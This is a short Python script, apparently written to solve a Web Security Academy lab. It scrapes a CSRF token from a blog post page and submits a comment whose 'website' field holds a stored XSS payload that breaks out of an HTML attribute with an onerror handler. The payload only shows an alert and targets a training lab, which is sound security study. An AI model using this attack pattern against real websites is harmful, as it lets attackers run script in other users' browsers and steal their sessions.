import requests
from urllib.parse import urljoin
from requests.cookies import RequestsCookieJar
from typing import Tuple, Text, Union
import bs4
from bs4 import BeautifulSoup



def scrape_csrf(url: Union[Text, bytes]) -> Tuple[str, RequestsCookieJar]:
    get_response = requests.get(url)
    html = get_response.content.decode('utf-8')
    soup = BeautifulSoup(html, 'html5lib')
    csrf_input = soup.find('input', {'name': 'csrf'})
    csrf_token = csrf_input['value']
    return csrf_token, get_response.cookies


base_url = 'https://ac821f151fa72f8fc0a661fe00a70098.web-security-academy.net'
token, cookies = scrape_csrf(urljoin(base_url, '/post?postId=2'))
data = {
  'csrf': token,
  'postId': '2',
  'comment': 'bbb',
  'name': 'bbb',
  'email': 'asdf@asdf.invalid',
  'website': '"><img src="" onerror="alert(1)'
}



response = requests.post(urljoin(base_url, '/post/comment'), cookies=cookies, data=data)
print(response.content)
